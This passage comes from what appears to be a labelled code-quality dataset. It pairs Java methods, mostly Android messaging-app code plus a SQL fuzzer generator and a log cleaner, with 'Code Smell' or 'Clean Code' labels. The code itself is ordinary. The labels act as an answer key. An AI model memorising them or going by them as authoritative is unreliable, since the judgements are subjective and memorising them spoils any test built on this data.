  Queue<Map<WorkflowAction,List<ConditionNextElement>>> queue=new LinkedBlockingQueue<>();
  if (MapUtils.isNotEmpty(workflowActionListMap)) {
    queue.add(workflowActionListMap);
  }
  while (!queue.isEmpty()) {
    workflowActionListMap=queue.remove();
    for (    List<ConditionNextElement> conditionNextElements : workflowActionListMap.values()) {
      for (      ConditionNextElement conditionNextElement : conditionNextElements) {
        Element element=conditionNextElement.getElement();
        if (element instanceof WorkflowTask) {
          WorkflowTask workflowTask=(WorkflowTask)element;
          nameToTaskMap.put(workflowTask.getName(),workflowTask);
        }
        if (element instanceof NextableElement) {
          NextableElement nextableElement=(NextableElement)element;
          Map<WorkflowAction,List<ConditionNextElement>> childListMap=nextableElement.getActionToNextElementMap();
          if (MapUtils.isNotEmpty(childListMap)) {
            queue.add(childListMap);
          }
        }
      }
    }
  }
  cloneProcess.setNameToTaskMap(nameToTaskMap);
  Map<ProcessEvent,List<ProcessEventListener>> cloneListeners=Maps.newHashMap();
  cloneListeners.putAll(listeners);
  cloneProcess.listeners=cloneListeners;
  return cloneProcess;
}
",1,Code Smell
"private void showNotification(String name,Bitmap photo){
  Intent intent=new Intent(this,LaunchActivity.class).setAction(groupCall != null ? ""voip_chat"" : ""voip"");
  if (groupCall != null) {
    intent.putExtra(""currentAccount"",currentAccount);
  }
  Notification.Builder builder=new Notification.Builder(this).setContentText(name).setContentIntent(PendingIntent.getActivity(this,50,intent,PendingIntent.FLAG_MUTABLE));
  if (groupCall != null) {
    builder.setContentTitle(ChatObject.isChannelOrGiga(chat) ? LocaleController.getString(""VoipLiveStream"",R.string.VoipLiveStream) : LocaleController.getString(""VoipVoiceChat"",R.string.VoipVoiceChat));
    builder.setSmallIcon(isMicMute() ? R.drawable.voicechat_muted : R.drawable.voicechat_active);
  }
 else {
    builder.setContentTitle(LocaleController.getString(""VoipOutgoingCall"",R.string.VoipOutgoingCall));
    builder.setSmallIcon(R.drawable.notification);
  }
  Intent endIntent=new Intent(this,VoIPActionsReceiver.class);
  endIntent.setAction(getPackageName() + "".END_CALL"");
  if (groupCall != null) {
    builder.addAction(R.drawable.ic_call_end_white_24dp,ChatObject.isChannelOrGiga(chat) ? LocaleController.getString(""VoipChannelLeaveAlertTitle"",R.string.VoipChannelLeaveAlertTitle) : LocaleController.getString(""VoipGroupLeaveAlertTitle"",R.string.VoipGroupLeaveAlertTitle),PendingIntent.getBroadcast(this,0,endIntent,PendingIntent.FLAG_MUTABLE | PendingIntent.FLAG_UPDATE_CURRENT));
  }
 else {
    builder.addAction(R.drawable.ic_call_end_white_24dp,LocaleController.getString(""VoipEndCall"",R.string.VoipEndCall),PendingIntent.getBroadcast(this,0,endIntent,PendingIntent.FLAG_MUTABLE | PendingIntent.FLAG_UPDATE_CURRENT));
  }
  builder.setPriority(Notification.PRIORITY_MAX);
  builder.setShowWhen(false);
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
    builder.setColor(0xff282e31);
    builder.setColorized(true);
  }
 else   if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
    builder.setColor(0xff2ca5e0);
  }
  if (Build.VERSION.SDK_INT >= 26) {
    NotificationsController.checkOtherNotificationsChannel();
    builder.setChannelId(NotificationsController.OTHER_NOTIFICATIONS_CHANNEL);
  }
  if (photo != null) {
    builder.setLargeIcon(photo);
  }
  try {
    startForeground(ID_ONGOING_CALL_NOTIFICATION,builder.getNotification());
  }
 catch (  Exception e) {
    if (photo != null && e instanceof IllegalArgumentException) {
      showNotification(name,null);
    }
  }
}
private void showNotification(){
  if (user != null) {
    showNotification(ContactsController.formatName(user.first_name,user.last_name),getRoundAvatarBitmap(user));
  }
 else {
    showNotification(chat.title,getRoundAvatarBitmap(chat));
  }
}",1,Code Smell
"public void loadDialogPhotos(long did,int count,int maxId,boolean fromCache,int classGuid){
  if (fromCache) {
    getMessagesStorage().getDialogPhotos(did,count,maxId,classGuid);
  }
 else {
    if (did > 0) {
      TLRPC.User user=getUser(did);
      if (user == null) {
        return;
      }
      TLRPC.TL_photos_getUserPhotos req=new TLRPC.TL_photos_getUserPhotos();
      req.limit=count;
      req.offset=0;
      req.max_id=maxId;
      req.user_id=getInputUser(user);
      int reqId=getConnectionsManager().sendRequest(req,(response,error) -> {
        if (error == null) {
          TLRPC.photos_Photos res=(TLRPC.photos_Photos)response;
          processLoadedUserPhotos(res,null,did,count,maxId,false,classGuid);
        }
      }
);
      getConnectionsManager().bindRequestToGuid(reqId,classGuid);
    }
 else     if (did < 0) {
      TLRPC.TL_messages_search req=new TLRPC.TL_messages_search();
      req.filter=new TLRPC.TL_inputMessagesFilterChatPhotos();
      req.limit=count;
      req.offset_id=maxId;
      req.q="""";
      req.peer=getInputPeer(did);
      int reqId=getConnectionsManager().sendRequest(req,(response,error) -> {
        if (error == null) {
          TLRPC.messages_Messages messages=(TLRPC.messages_Messages)response;
          TLRPC.TL_photos_photos res=new TLRPC.TL_photos_photos();
          ArrayList<TLRPC.Message> arrayList=new ArrayList<>();
          res.count=messages.count;
          res.users.addAll(messages.users);
          for (int a=0; a < messages.messages.size(); a++) {
            TLRPC.Message message=messages.messages.get(a);
            if (message.action == null || message.action.photo == null) {
              continue;
            }
            res.photos.add(message.action.photo);
            arrayList.add(message);
          }
          processLoadedUserPhotos(res,arrayList,did,count,maxId,false,classGuid);
        }
      }
);
      getConnectionsManager().bindRequestToGuid(reqId,classGuid);
    }
  }
}",1,Code Smell
"public static SQLQueryAdapter create(MaterializeGlobalState globalState){
  MaterializeTable randomTable=globalState.getSchema().getRandomTable();
  List<MaterializeIndex> indexes=randomTable.getIndexes();
  StringBuilder sb=new StringBuilder();
  sb.append(""DROP INDEX "");
  if (Randomly.getBoolean() || indexes.isEmpty()) {
    sb.append(""IF EXISTS "");
    for (int i=0; i < Randomly.smallNumber() + 1; i++) {
      if (i != 0) {
        sb.append("", "");
      }
      if (indexes.isEmpty() || Randomly.getBoolean()) {
        sb.append(DBMSCommon.createIndexName(Randomly.smallNumber()));
      }
 else {
        sb.append(Randomly.fromList(indexes).getIndexName());
      }
    }
  }
 else {
    for (int i=0; i < Randomly.smallNumber() + 1; i++) {
      if (i != 0) {
        sb.append("", "");
      }
      sb.append(Randomly.fromList(indexes).getIndexName());
    }
  }
  if (Randomly.getBoolean()) {
    sb.append("" "");
    sb.append(Randomly.fromOptions(""CASCADE"",""RESTRICT""));
  }
  return new SQLQueryAdapter(sb.toString(),ExpectedErrors.from(""cannot drop desired object(s) because other objects depend on them"",""cannot drop index"",""does not exist""),true);
}",1,Code Smell
"public void start(final long logRetentionDays){
  if (logRetentionDays < 3) {
    return;
  }
  localThread=new Thread(() -> {
    while (!toStop) {
      try {
        File[] childDirs=new File(JobFileAppender.getLogPath()).listFiles();
        if (childDirs != null && childDirs.length > 0) {
          Calendar todayCal=Calendar.getInstance();
          todayCal.set(Calendar.HOUR_OF_DAY,0);
          todayCal.set(Calendar.MINUTE,0);
          todayCal.set(Calendar.SECOND,0);
          todayCal.set(Calendar.MILLISECOND,0);
          Date todayDate=todayCal.getTime();
          for (          File childFile : childDirs) {
            if (!childFile.isDirectory() || childFile.getName().indexOf(""-"") == -1) {
              continue;
            }
            Date logFileCreateDate=null;
            try {
              SimpleDateFormat simpleDateFormat=new SimpleDateFormat(""yyyy-MM-dd"");
              logFileCreateDate=simpleDateFormat.parse(childFile.getName());
            }
 catch (            ParseException e) {
              logger.error(e.getMessage(),e);
            }
            if (logFileCreateDate == null) {
              continue;
            }
            if ((todayDate.getTime() - logFileCreateDate.getTime()) >= logRetentionDays * (24 * 60 * 60* 1000)) {
              FileUtil.deleteRecursively(childFile);
            }
          }
        }
      }
 catch (      Exception e) {
        if (!toStop) {
          logger.error(e.getMessage(),e);
        }
      }
      try {
        TimeUnit.DAYS.sleep(1);
      }
 catch (      InterruptedException e) {
        if (!toStop) {
          logger.error(e.getMessage(),e);
        }
      }
    }
    logger.info("">>>>>>>>>>> web, executor JobLogFileCleanThread thread destory."");
  }
);
  localThread.setDaemon(true);
  localThread.setName(""web, executor JobLogFileCleanThread"");
  localThread.start();
}",1,Code Smell
"private static CodeBook readBook(VorbisBitArray bitArray) throws ParserException {
  if (bitArray.readBits(24) != 0x564342) {
    throw new ParserException(""expected code book to start with [0x56, 0x43, 0x42] at "" + bitArray.getPosition());
  }
  int dimensions=bitArray.readBits(16);
  int entries=bitArray.readBits(24);
  long[] lengthMap=new long[entries];
  boolean isOrdered=bitArray.readBit();
  if (!isOrdered) {
    boolean isSparse=bitArray.readBit();
    for (int i=0; i < lengthMap.length; i++) {
      if (isSparse) {
        if (bitArray.readBit()) {
          lengthMap[i]=(long)(bitArray.readBits(5) + 1);
        }
 else {
          lengthMap[i]=0;
        }
      }
 else {
        lengthMap[i]=(long)(bitArray.readBits(5) + 1);
      }
    }
  }
 else {
    int length=bitArray.readBits(5) + 1;
    for (int i=0; i < lengthMap.length; ) {
      int num=bitArray.readBits(iLog(entries - i));
      for (int j=0; j < num && i < lengthMap.length; i++, j++) {
        lengthMap[i]=length;
      }
      length++;
    }
  }
  int lookupType=bitArray.readBits(4);
  if (lookupType > 2) {
    throw new ParserException(""lookup type greater than 2 not decodable: "" + lookupType);
  }
 else   if (lookupType == 1 || lookupType == 2) {
    bitArray.skipBits(32);
    bitArray.skipBits(32);
    int valueBits=bitArray.readBits(4) + 1;
    bitArray.skipBits(1);
    long lookupValuesCount;
    if (lookupType == 1) {
      if (dimensions != 0) {
        lookupValuesCount=mapType1QuantValues(entries,dimensions);
      }
 else {
        lookupValuesCount=0;
      }
    }
 else {
      lookupValuesCount=(long)entries * dimensions;
    }
    bitArray.skipBits((int)(lookupValuesCount * valueBits));
  }
  return new CodeBook(dimensions,entries,lengthMap,lookupType,isOrdered);
}",1,Code Smell
"@Override protected ScanResult processData(byte[] data,int width,int height,boolean isRetry){
  Result rawResult=null;
  Rect scanBoxAreaRect=null;
  try {
    PlanarYUVLuminanceSource source;
    scanBoxAreaRect=mScanBoxView.getScanBoxAreaRect(height);
    if (scanBoxAreaRect != null) {
      source=new PlanarYUVLuminanceSource(data,width,height,scanBoxAreaRect.left,scanBoxAreaRect.top,scanBoxAreaRect.width(),scanBoxAreaRect.height(),false);
    }
 else {
      source=new PlanarYUVLuminanceSource(data,width,height,0,0,width,height,false);
    }
    rawResult=mMultiFormatReader.decodeWithState(new BinaryBitmap(new GlobalHistogramBinarizer(source)));
    if (rawResult == null) {
      rawResult=mMultiFormatReader.decodeWithState(new BinaryBitmap(new HybridBinarizer(source)));
      if (rawResult != null) {
        BGAQRCodeUtil.d(""GlobalHistogramBinarizer 娌¤瘑鍒埌锛孒ybridBinarizer 鑳借瘑鍒埌"");
      }
    }
  }
 catch (  Exception e) {
    e.printStackTrace();
  }
 finally {
    mMultiFormatReader.reset();
  }
  if (rawResult == null) {
    return null;
  }
  String result=rawResult.getText();
  if (TextUtils.isEmpty(result)) {
    return null;
  }
  BarcodeFormat barcodeFormat=rawResult.getBarcodeFormat();
  BGAQRCodeUtil.d(""鏍煎紡涓猴細"" + barcodeFormat.name());
  boolean isNeedAutoZoom=isNeedAutoZoom(barcodeFormat);
  if (isShowLocationPoint() || isNeedAutoZoom) {
    ResultPoint[] resultPoints=rawResult.getResultPoints();
    final PointF[] pointArr=new PointF[resultPoints.length];
    int pointIndex=0;
    for (    ResultPoint resultPoint : resultPoints) {
      pointArr[pointIndex]=new PointF(resultPoint.getX(),resultPoint.getY());
      pointIndex++;
    }
    if (transformToViewCoordinates(pointArr,scanBoxAreaRect,isNeedAutoZoom,result)) {
      return null;
    }
  }
  return new ScanResult(result);
}",1,Code Smell
"private void showAlertForWord(FilterKeyword word){
  AlertDialog.Builder bldr=new M3AlertDialogBuilder(getActivity()).setHelpText(R.string.filter_add_word_help).setTitle(word == null ? R.string.add_muted_word : R.string.edit_muted_word).setNegativeButton(R.string.cancel,null);
  FloatingHintEditTextLayout editWrap=(FloatingHintEditTextLayout)bldr.getContext().getSystemService(LayoutInflater.class).inflate(R.layout.floating_hint_edit_text,null);
  EditText edit=editWrap.findViewById(R.id.edit);
  edit.setHint(R.string.filter_word_or_phrase);
  edit.setInputType(InputType.TYPE_TEXT_VARIATION_FILTER);
  editWrap.updateHint();
  bldr.setView(editWrap).setPositiveButton(word == null ? R.string.add : R.string.save,null);
  if (word != null) {
    edit.setText(word.keyword);
    bldr.setNeutralButton(R.string.delete,null);
  }
  AlertDialog alert=bldr.show();
  if (word != null) {
    Button deleteBtn=alert.getButton(AlertDialog.BUTTON_NEUTRAL);
    deleteBtn.setTextColor(UiUtils.getThemeColor(getActivity(),R.attr.colorM3Error));
    deleteBtn.setOnClickListener(v -> confirmDeleteWords(Collections.singletonList(word),alert::dismiss));
  }
  Button saveBtn=alert.getButton(AlertDialog.BUTTON_POSITIVE);
  saveBtn.setEnabled(false);
  saveBtn.setOnClickListener(v -> {
    String input=edit.getText().toString();
    for (    ListItem<FilterKeyword> item : data) {
      if (item.parentObject.keyword.equalsIgnoreCase(input)) {
        editWrap.setErrorState(getString(R.string.filter_word_already_in_list));
        return;
      }
    }
    if (word == null) {
      FilterKeyword w=new FilterKeyword();
      w.wholeWord=true;
      w.keyword=input;
      ListItem<FilterKeyword> item=new ListItem<>(w.keyword,null,null,w);
      item.isEnabled=true;
      item.setOnClick(this::onWordClick);
      data.add(item);
      itemsAdapter.notifyItemInserted(data.size() - 1);
    }
 else {
      word.keyword=input;
      word.wholeWord=true;
      for (      ListItem<FilterKeyword> item : data) {
        if (item.parentObject == word) {
          rebindItem(item);
          break;
        }
      }
    }
    alert.dismiss();
  }
);
  edit.addTextChangedListener(new SimpleTextWatcher(e -> saveBtn.setEnabled(e.length() > 0)));
}",1,Code Smell
"@Override public void onReceive(Context context,Intent intent){
switch (getResultCode()) {
case Activity.RESULT_OK:
    break;
case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
  Toast.makeText(context,""SMS generic failure, close app & upload logs."",Toast.LENGTH_SHORT).show();
if (BuildConfig.DEBUG) {
  int errorCode=intent.getIntExtra(""errorCode"",-1);
  if (errorCode != -1) {
    MainBrowserScreen.rootLogger.log(Level.INFO,""Error code: "" + String.valueOf(errorCode));
  }
 else {
    MainBrowserScreen.rootLogger.log(Level.INFO,""Unknown Error code: -1. This should never happen!"");
  }
}
break;
case SmsManager.RESULT_ERROR_NO_SERVICE:
Toast.makeText(context,""SMS no service"",Toast.LENGTH_SHORT).show();
break;
case SmsManager.RESULT_ERROR_NULL_PDU:
Toast.makeText(context,""SMS null PDU"",Toast.LENGTH_SHORT).show();
break;
case SmsManager.RESULT_ERROR_RADIO_OFF:
Toast.makeText(context,""SMS radio off - turn off airplane mode!"",Toast.LENGTH_SHORT).show();
break;
}
}",0,Clean Code
"public static void handleReadDocument(Activity activity,@Nullable Uri data) throws IOException, JSONException {
  if (data == null)   return;
  SharedPreferences.Editor edit=PrefsUtils.mSharedPreferences.edit();
  InputStream inputStream=activity.getContentResolver().openInputStream(data);
  BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(inputStream));
  StringBuilder stringBuilder=new StringBuilder();
  String line=bufferedReader.readLine();
  while (line != null) {
    stringBuilder.append(line);
    line=bufferedReader.readLine();
  }
  String read=stringBuilder.toString();
  JSONObject jsonObject=new JSONObject(read);
  Iterator<String> keys=jsonObject.keys();
  while (keys.hasNext()) {
    String key=keys.next();
    Object value=jsonObject.get(key);
    if (value instanceof String) {
      if (((String)value).contains(""["") && ((String)value).contains(""]"")) {
        value=((String)value).replace(""["","""").replace(""]"","""").replace("" "","""");
        String[] array=((String)value).split("","");
        List<String> list=Arrays.asList(array);
        Set<String> stringSet=new HashSet<>(list);
        edit.putStringSet(key,stringSet);
      }
 else {
        edit.putString(key,(String)value);
      }
    }
 else     if (value instanceof Boolean) {
      edit.putBoolean(key,(Boolean)value);
    }
 else     if (value instanceof Integer) {
      edit.putInt(key,(Integer)value);
    }
  }
  bufferedReader.close();
  edit.apply();
}
",1,Code Smell
"public List<SchemaChangeEvent> applySchemaChange(SchemaChangeEvent schemaChangeEvent){
  for (  Tuple2<Selectors,TableId> route : routes) {
    TableId originalTable=schemaChangeEvent.tableId();
    if (!route.f0.isMatch(originalTable)) {
      continue;
    }
    TableId derivedTable=route.f1;
    Set<TableId> originalTables=derivationMapping.computeIfAbsent(derivedTable,t -> new HashSet<>());
    originalTables.add(originalTable);
    if (originalTables.size() == 1) {
      SchemaChangeEvent derivedSchemaChangeEvent=ChangeEventUtils.recreateSchemaChangeEvent(schemaChangeEvent,derivedTable);
      schemaManager.applySchemaChange(derivedSchemaChangeEvent);
      return Collections.singletonList(derivedSchemaChangeEvent);
    }
    Schema derivedTableSchema=schemaManager.getLatestSchema(derivedTable).get();
    if (schemaChangeEvent instanceof CreateTableEvent) {
      return handleCreateTableEvent((CreateTableEvent)schemaChangeEvent,derivedTableSchema,derivedTable);
    }
 else     if (schemaChangeEvent instanceof AddColumnEvent) {
      return handleAddColumnEvent((AddColumnEvent)schemaChangeEvent,derivedTableSchema,derivedTable);
    }
 else     if (schemaChangeEvent instanceof AlterColumnTypeEvent) {
      return handleAlterColumnTypeEvent((AlterColumnTypeEvent)schemaChangeEvent,derivedTableSchema,derivedTable);
    }
 else     if (schemaChangeEvent instanceof DropColumnEvent) {
      return Collections.emptyList();
    }
 else     if (schemaChangeEvent instanceof RenameColumnEvent) {
      return handleRenameColumnEvent((RenameColumnEvent)schemaChangeEvent,derivedTableSchema,derivedTable);
    }
 else {
      throw new IllegalStateException(String.format(""Unrecognized SchemaChangeEvent type: %s"",schemaChangeEvent));
    }
  }
  return Collections.singletonList(schemaChangeEvent);
}",1,Code Smell
"private void deleteNotificationChannelInternal(long dialogId,long topicId,int what){
  if (Build.VERSION.SDK_INT < 26) {
    return;
  }
  try {
    SharedPreferences preferences=getAccountInstance().getNotificationsSettings();
    SharedPreferences.Editor editor=preferences.edit();
    if (what == 0 || what == -1) {
      String key=""org.telegram.key"" + dialogId;
      if (topicId != 0) {
        key+="".topic"" + topicId;
      }
      String channelId=preferences.getString(key,null);
      if (channelId != null) {
        editor.remove(key).remove(key + ""_s"");
        try {
          systemNotificationManager.deleteNotificationChannel(channelId);
        }
 catch (        Exception e) {
          FileLog.e(e);
        }
        if (BuildVars.LOGS_ENABLED) {
          FileLog.d(""delete channel internal "" + channelId);
        }
      }
    }
    if (what == 1 || what == -1) {
      String key=""org.telegram.keyia"" + dialogId;
      String channelId=preferences.getString(key,null);
      if (channelId != null) {
        editor.remove(key).remove(key + ""_s"");
        try {
          systemNotificationManager.deleteNotificationChannel(channelId);
        }
 catch (        Exception e) {
          FileLog.e(e);
        }
        if (BuildVars.LOGS_ENABLED) {
          FileLog.d(""delete channel internal "" + channelId);
        }
      }
    }
    editor.commit();
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
}",1,Code Smell
"private LakeSoulStaticSplitEnumerator staticSplitEnumerator(SplitEnumeratorContext<LakeSoulSplit> enumContext,TableInfo tableInfo,List<String> readStartTimestampWithTimeZone,String readType){
  List<String> readEndTimestampWithTimeZone=Arrays.asList(optionParams.getOrDefault(LakeSoulOptions.READ_END_TIME(),""""),optionParams.getOrDefault(LakeSoulOptions.TIME_ZONE(),""""));
  List<DataFileInfo> dataFileInfoList;
  if (readType.equals("""") || readType.equals(""fullread"")) {
    dataFileInfoList=Arrays.asList(getTargetDataFileInfo(tableInfo));
  }
 else {
    dataFileInfoList=new ArrayList<>();
    List<String> partDescs=new ArrayList<>();
    String partitionDescOpt=optionParams.getOrDefault(LakeSoulOptions.PARTITION_DESC(),"""");
    if (partitionDescOpt.isEmpty() && remainingPartitions != null) {
      for (      Map<String,String> part : remainingPartitions) {
        String desc=DBUtil.formatPartitionDesc(part);
        partDescs.add(desc);
      }
    }
 else {
      partDescs.add(partitionDescOpt);
    }
    for (    String desc : partDescs) {
      dataFileInfoList.addAll(Arrays.asList(DataOperation.getIncrementalPartitionDataInfo(tableInfo.getTableId(),desc,convertTimeFormatWithTimeZone(readStartTimestampWithTimeZone),convertTimeFormatWithTimeZone(readEndTimestampWithTimeZone),readType)));
    }
  }
  int capacity=100;
  ArrayList<LakeSoulSplit> splits=new ArrayList<>(capacity);
  if (!FlinkUtil.isExistHashPartition(tableInfo)) {
    for (    DataFileInfo dataFileInfo : dataFileInfoList) {
      ArrayList<Path> tmp=new ArrayList<>();
      tmp.add(new Path(dataFileInfo.path()));
      splits.add(new LakeSoulSplit(String.valueOf(dataFileInfo.hashCode()),tmp,0));
    }
  }
 else {
    Map<String,Map<Integer,List<Path>>> splitByRangeAndHashPartition=FlinkUtil.splitDataInfosToRangeAndHashPartition(tableInfo.getTableId(),dataFileInfoList.toArray(new DataFileInfo[0]));
    for (    Map.Entry<String,Map<Integer,List<Path>>> entry : splitByRangeAndHashPartition.entrySet()) {
      for (      Map.Entry<Integer,List<Path>> split : entry.getValue().entrySet()) {
        splits.add(new LakeSoulSplit(String.valueOf(split.hashCode()),split.getValue(),0));
      }
    }
  }
  return new LakeSoulStaticSplitEnumerator(enumContext,new LakeSoulSimpleSplitAssigner(splits));
}",1,Code Smell
"private void loadInactiveChannels(){
  loading=true;
  updateRows();
  TLRPC.TL_channels_getInactiveChannels inactiveChannelsRequest=new TLRPC.TL_channels_getInactiveChannels();
  ConnectionsManager.getInstance(currentAccount).sendRequest(inactiveChannelsRequest,((response,error) -> {
    if (error == null) {
      final TLRPC.TL_messages_inactiveChats chats=(TLRPC.TL_messages_inactiveChats)response;
      final ArrayList<String> signatures=new ArrayList<>();
      final int count=Math.min(chats.chats.size(),chats.dates.size());
      for (int i=0; i < count; i++) {
        TLRPC.Chat chat=chats.chats.get(i);
        int currentDate=ConnectionsManager.getInstance(currentAccount).getCurrentTime();
        int date=chats.dates.get(i);
        int daysDif=(currentDate - date) / 86400;
        String dateFormat;
        if (daysDif < 30) {
          dateFormat=LocaleController.formatPluralString(""Days"",daysDif);
        }
 else         if (daysDif < 365) {
          dateFormat=LocaleController.formatPluralString(""Months"",daysDif / 30);
        }
 else {
          dateFormat=LocaleController.formatPluralString(""Years"",daysDif / 365);
        }
        if (ChatObject.isMegagroup(chat)) {
          String members=LocaleController.formatPluralString(""Members"",chat.participants_count);
          signatures.add(LocaleController.formatString(""InactiveChatSignature"",R.string.InactiveChatSignature,members,dateFormat));
        }
 else         if (ChatObject.isChannel(chat)) {
          signatures.add(LocaleController.formatString(""InactiveChannelSignature"",R.string.InactiveChannelSignature,dateFormat));
        }
 else {
          String members=LocaleController.formatPluralString(""Members"",chat.participants_count);
          signatures.add(LocaleController.formatString(""InactiveChatSignature"",R.string.InactiveChatSignature,members,dateFormat));
        }
      }
      AndroidUtilities.runOnUIThread(() -> {
        inactiveChatsSignatures.clear();
        inactiveChats.clear();
        inactiveChatsSignatures.addAll(signatures);
        for (int i=0; i < count; i++) {
          inactiveChats.add(chats.chats.get(i));
        }
        loading=false;
        enterAnimator.showItemsAnimated(chatsTitleRow + 4);
        int savedTop=0;
        for (int i=0; i < recyclerListView.getChildCount(); i++) {
          if (recyclerListView.getChildAt(i) instanceof HeaderView) {
            savedTop=recyclerListView.getChildAt(i).getTop();
            break;
          }
        }
        updateRows();
        if (headerRow >= 0 && savedTop != 0) {
          ((LinearLayoutManager)recyclerListView.getLayoutManager()).scrollToPositionWithOffset(headerRow + 1,savedTop);
        }
        if (limitParams == null) {
          limitParams=getLimitParams(type,currentAccount);
        }
        int currentValue=Math.max(inactiveChats.size(),limitParams.defaultLimit);
        if (limitPreviewView != null) {
          limitPreviewView.setIconValue(currentValue,false);
          limitPreviewView.setBagePosition(currentValue / (float)limitParams.premiumLimit);
          limitPreviewView.startDelayedAnimation();
        }
      }
);
    }
  }
));
}",1,Code Smell
"private void checkAllFilesSelected(int type,boolean added){
  if (!isDialog) {
    return;
  }
  if (!added) {
    if (type == CacheControlActivity.TYPE_PHOTOS) {
      allPhotosSelected=false;
    }
 else     if (type == CacheControlActivity.TYPE_VIDEOS) {
      allVideosSelected=false;
    }
 else     if (type == CacheControlActivity.TYPE_DOCUMENTS) {
      allDocumentsSelected=false;
    }
 else     if (type == CacheControlActivity.TYPE_MUSIC) {
      allMusicSelected=false;
    }
 else     if (type == CacheControlActivity.TYPE_VOICE) {
      allVoiceSelected=false;
    }
 else     if (type == CacheControlActivity.TYPE_STORIES) {
      allStoriesSelected=false;
    }
  }
 else {
    if (type == CacheControlActivity.TYPE_PHOTOS) {
      allPhotosSelected=checkAllFilesSelectedInArray(type,media);
    }
 else     if (type == CacheControlActivity.TYPE_VIDEOS) {
      allVideosSelected=checkAllFilesSelectedInArray(type,media);
    }
 else     if (type == CacheControlActivity.TYPE_DOCUMENTS) {
      allDocumentsSelected=checkAllFilesSelectedInArray(type,documents);
    }
 else     if (type == CacheControlActivity.TYPE_MUSIC) {
      allMusicSelected=checkAllFilesSelectedInArray(type,music);
    }
 else     if (type == CacheControlActivity.TYPE_VOICE) {
      allVoiceSelected=checkAllFilesSelectedInArray(type,voice);
    }
 else     if (type == CacheControlActivity.TYPE_STORIES) {
      allStoriesSelected=checkAllFilesSelectedInArray(type,stories);
    }
  }
}
",1,Code Smell
"public static int[] calcDrawableColor(Drawable drawable){
  if (drawable instanceof ChatBackgroundDrawable) {
    ChatBackgroundDrawable chatBackgroundDrawable=(ChatBackgroundDrawable)drawable;
    return calcDrawableColor(chatBackgroundDrawable.getDrawable(true));
  }
  int bitmapColor=0xff000000;
  int[] result=new int[4];
  try {
    if (drawable instanceof BitmapDrawable) {
      Bitmap bitmap=((BitmapDrawable)drawable).getBitmap();
      bitmapColor=calcBitmapColor(bitmap);
    }
 else     if (drawable instanceof ColorDrawable) {
      bitmapColor=((ColorDrawable)drawable).getColor();
    }
 else     if (drawable instanceof BackgroundGradientDrawable) {
      int[] colors=((BackgroundGradientDrawable)drawable).getColorsList();
      if (colors != null) {
        if (colors.length > 1) {
          bitmapColor=getAverageColor(colors[0],colors[1]);
        }
 else         if (colors.length > 0) {
          bitmapColor=colors[0];
        }
      }
    }
 else     if (drawable instanceof MotionBackgroundDrawable) {
      result[0]=result[2]=Color.argb(0x2D,0,0,0);
      result[1]=result[3]=Color.argb(0x3D,0,0,0);
      return result;
    }
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
  double[] hsv=rgbToHsv((bitmapColor >> 16) & 0xff,(bitmapColor >> 8) & 0xff,bitmapColor & 0xff);
  hsv[1]=Math.min(1.0,hsv[1] + 0.05 + 0.1 * (1.0 - hsv[1]));
  double v=Math.max(0,hsv[2] * 0.65);
  int[] rgb=hsvToRgb(hsv[0],hsv[1],v);
  result[0]=Color.argb(0x66,rgb[0],rgb[1],rgb[2]);
  result[1]=Color.argb(0x88,rgb[0],rgb[1],rgb[2]);
  double v2=Math.max(0,hsv[2] * 0.72);
  rgb=hsvToRgb(hsv[0],hsv[1],v2);
  result[2]=Color.argb(0x66,rgb[0],rgb[1],rgb[2]);
  result[3]=Color.argb(0x88,rgb[0],rgb[1],rgb[2]);
  return result;
}",1,Code Smell
"private void checkRowsEnabled(){
  if (!exceptions.isEmpty()) {
    return;
  }
  int count=listView.getChildCount();
  ArrayList<Animator> animators=new ArrayList<>();
  boolean enabled=getNotificationsController().isGlobalNotificationsEnabled(currentType);
  for (int a=0; a < count; a++) {
    View child=listView.getChildAt(a);
    RecyclerListView.Holder holder=(RecyclerListView.Holder)listView.getChildViewHolder(child);
switch (holder.getItemViewType()) {
case 0:
{
        HeaderCell headerCell=(HeaderCell)holder.itemView;
        if (holder.getAdapterPosition() == messageSectionRow) {
          headerCell.setEnabled(enabled,animators);
        }
        break;
      }
case 1:
{
      TextCheckCell textCell=(TextCheckCell)holder.itemView;
      textCell.setEnabled(enabled,animators);
      break;
    }
case 3:
{
    TextColorCell textCell=(TextColorCell)holder.itemView;
    textCell.setEnabled(enabled,animators);
    break;
  }
case 5:
{
  TextSettingsCell textCell=(TextSettingsCell)holder.itemView;
  textCell.setEnabled(enabled,animators);
  break;
}
}
}
if (!animators.isEmpty()) {
if (animatorSet != null) {
animatorSet.cancel();
}
animatorSet=new AnimatorSet();
animatorSet.playTogether(animators);
animatorSet.addListener(new AnimatorListenerAdapter(){
@Override public void onAnimationEnd(Animator animator){
if (animator.equals(animatorSet)) {
  animatorSet=null;
}
}
}
);
animatorSet.setDuration(150);
animatorSet.start();
}
}",1,Code Smell
"@Override public void onRequestPermissionsResult(int requestCode,String[] permissions,int[] grantResults){
  super.onRequestPermissionsResult(requestCode,permissions,grantResults);
  if (!checkPermissionsResult(requestCode,permissions,grantResults))   return;
  if (ApplicationLoader.applicationLoaderInstance != null && ApplicationLoader.applicationLoaderInstance.checkRequestPermissionResult(requestCode,permissions,grantResults))   return;
  if (actionBarLayout.getFragmentStack().size() != 0) {
    BaseFragment fragment=actionBarLayout.getFragmentStack().get(actionBarLayout.getFragmentStack().size() - 1);
    fragment.onRequestPermissionsResultFragment(requestCode,permissions,grantResults);
  }
  if (AndroidUtilities.isTablet()) {
    if (rightActionBarLayout.getFragmentStack().size() != 0) {
      BaseFragment fragment=rightActionBarLayout.getFragmentStack().get(rightActionBarLayout.getFragmentStack().size() - 1);
      fragment.onRequestPermissionsResultFragment(requestCode,permissions,grantResults);
    }
    if (layersActionBarLayout.getFragmentStack().size() != 0) {
      BaseFragment fragment=layersActionBarLayout.getFragmentStack().get(layersActionBarLayout.getFragmentStack().size() - 1);
      fragment.onRequestPermissionsResultFragment(requestCode,permissions,grantResults);
    }
  }
  VoIPFragment.onRequestPermissionsResult(requestCode,permissions,grantResults);
  StoryRecorder.onRequestPermissionsResult(requestCode,permissions,grantResults);
